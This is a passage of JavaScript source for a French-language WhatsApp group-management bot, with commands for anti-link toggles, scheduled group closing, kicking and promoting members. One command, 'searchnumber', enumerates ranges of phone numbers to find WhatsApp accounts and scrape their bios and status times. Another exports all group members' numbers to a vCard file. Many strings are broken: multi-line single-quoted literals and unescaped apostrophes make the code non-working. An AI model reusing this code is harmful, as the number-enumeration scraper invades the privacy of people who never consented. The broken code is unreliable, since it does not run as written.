                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-document':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antidocument = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antidocument = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_contact':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
         
               if (args[0] === 'oui') {
                  db.data.chats[from].anticontact = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].anticontact = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_localisation':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  db.data.chats[from].antilocation = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antilocation = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_lien': {
               if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  db.data.chats[from].antilink = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antilink = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'anti_liengroupe': {
               if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  db.data.chats[from].antilinkgc = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antilinkgc = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'anti_promotion': {
               if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  db.data.chats[from].antipromotion = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antipromotion = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'bienvenue':
            case 'rip': {
               if (!m.isGroup) return KevStickGroup()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  welcome = true
                  replygckev('${command} activee')
               } else if (args[0] === 'non') {
                  welcome = false
                  replygckev('${command} desactivee')
               }else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'admin_event': {
               if (!m.isGroup) return KevStickGroup()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  adminevent = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  adminevent = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'group_event': {
               if (!m.isGroup) return KevStickGroup()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               if (args[0] === 'oui') {
                  groupevent = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  groupevent = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
            case 'inviter': {
	if (!m.isGroup) return KevStickGroup()
	if (!isBotAdmins) return KevStickBotAdmin()
if (!text) return replygckev('Veuillez entrer le numero que vous desirez inviter dans le groupe\n\nExemple :\n*${prefix + command}* 237656774511')
if (text.includes('+')) return replygckev('Veuillez entrer le numero sans *+*')
if (isNaN(text)) return replygckev('Veiillez entrer le numero, avec le code du pays inclus et sans espace')
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Kev.groupInviteCode(group)
      await Kev.sendMessage(text+'@s.whatsapp.net', {text: '≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}', mentions: [m.sender]})
        replygckev(' Un lien d'invitation a ete send a cet utilisateur') 
}
break
            case 'temps_fermeture':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * '1000'
                } else if (args[1] == 'minute') {
                    var timer = args[0] * '60000'
                } else if (args[1] == 'hour') {
                    var timer = args[0] * '3600000'
                } else if (args[1] == 'day') {
                    var timer = args[0] * '86400000'
                } else {
                    return replygckev('*selections:*\nsecond\nminute\nhour\n\n*Exemple*\n7 hour')
                }
                replygckev('Temps de fermeture ${q} a partir de maintenant')
                setTimeout(() => {
                    var nomor = m.participant
                    const close = '*Temps de fermeture* groupe fermey par un admin\nmaintenant seuls les admins peuvent envoyer des messages dans le groupe'
                    Kev.groupSettingUpdate(m.chat, 'announcement')
                    replygckev(close)
                }, timer)
                break
            case 'temps_ouverture':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !KevTheCreator) return replygckev(mess.admin)
                if (!isBotAdmins) return KevStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * '1000'
                } else if (args[1] == 'minute') {
                    var timer = args[0] * '60000'
                } else if (args[1] == 'hour') {
                    var timer = args[0] * '3600000'
                } else if (args[1] == 'day') {
                    var timer = args[0] * '86400000'
                } else {
                    return replygckev('*selections:*\nsecond\nminute\nhour\n\n*exemple*\n7 hour')
                }
                replygckev('Heure d'ouverture ${q} a partir de maintenant')
                setTimeout(() => {
                    var nomor = m.participant
                    const open = '*Yemps d'ouverture* groupe ouvert par un admin\ntout le monde peut a present ecrire'
                    Kev.groupSettingUpdate(m.chat, 'not_announcement')
                    replygckev(open)
                }, timer)
                break
            case 'kick': 
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Kev.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                replygckev(mess.done)
                break

                case "id_groupe": case "groupid": {
if (!KevTheCreator) return KevStickOwner()
let getGroups = await Kev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = '⬣ *LA LISTE DES GROUPES EST LA SUIVANTE*\n\nN total de groupe : ${anu.length} Groupe\n\n'
for (let x of anu) {
let metadata2 = await Kev.groupMetadata(x)
teks += '◉ Nom : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Membre : ${metadata2.participants.length}\n\n────────────────────────\n\n'
}
replygckev(teks + 'Veuillez entrer la commande ${prefix}pushcontact pour utiliser idgroup|teks\n\nApres l.avoir utilisey veuillez tout d.abord copir l.id du groupe')
}
break
case 'num-whatsApp': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygckev('Veuillez entrer un num�ro incomplet finissant par x\n\nExemple: ${prefix + command} 23765677451x')
var inputnumber = text.split(" ")[0]
        
        replygckev('recherche encours...')
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = '*==[ Liste des numeros WhatsApp ]==*\n\n'
        var nobio = '\n*Bio:* || \nHey there! I am using WhatsApp.\n'
        var nowhatsapp = '\n*Numbers with no WhatsApp account within provided range.*\n'
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = '${status1}'
            } else if (random_length == 2) {
                random21 = '${status1}${status2}'
            } else if (random_length == 3) {
                random21 = '${status1}${status2}${status3}'
            } else if (random_length == 4) {
                random21 = '${status1}${status2}${status3}${dom4}'
            }
            var anu = await Kev.onWhatsApp('${number0}${i}${number1}@s.whatsapp.net')
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Kev.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += 'wa.me/${anu[0].jid.split("@")[0]}\n'
                } else {
                    text66 += '🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/Abidjan').format('HH:mm:ss DD/MM/YYYY')}\n\n'
                }
            } catch {
                nowhatsapp += '${number0}${i}${number1}\n'
            }
        }
        replygckev('${text66}${nobio}${nowhatsapp}')
        }
break
case 'voir_contact': case 'getcon': {
if (!m.isGroup) return KevStickGroup()
if (!(isGroupAdmins || KevTheCreator)) return KevStickAdmin()
kevbigpp = await Kev.sendMessage(m.chat, {
    text: '\nGroupe: *${groupMetadata.subject}*\nMembre: *${participants.length}*'
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
Kev.sendContact(m.chat, participants.map(a => a.id), kevbigpp)
}
break
case 'reg_contact': case 'svcontact':{
if (!m.isGroup) return KevStickGroup()
if (!(isGroupAdmins || KevTheCreator)) return KevStickAdmin()
let cmiggc = await Kev.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += 'BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n'
}
let nmfilect = './contacts.vcf'
replygckev('\sauvegarde encours... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Kev.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'send_contact': case 'sencontact': {
if (!m.isGroup) return KevStickGroup()
if (!m.mentionedJid[0]) return replygckev('\nVeuillez l.utiliser comme tel\n Exemple:.send_contact @tag|nom')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Kev.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'tag_contact': case 'contag':{
if (!m.isGroup) return KevStickGroup()
if (!(isGroupAdmins || KevTheCreator)) return KevStickAdmin()
if (!m.mentionedJid[0]) return replygckev('\nVeuillez l.utiliser comme tel\n Exemple:.tag_contact @tag|nom')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Kev.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return KevStickGroup()
                if(!KevTheCreator) return KevStickOwner()
                if (!isBotAdmins) return KevStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Kev.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygckev(mess.done)
                break
            case 'nomination':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Kev.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygckev(mess.done)
                break
            case 'denomination':
                if (!m.isGroup) return KevStickGroup()
                if (!isAdmins && !isGroupOwner && !KevTheCreator) return KevStickAdmin()
                if (!isBotAdmins) return KevStickBotAdmin()
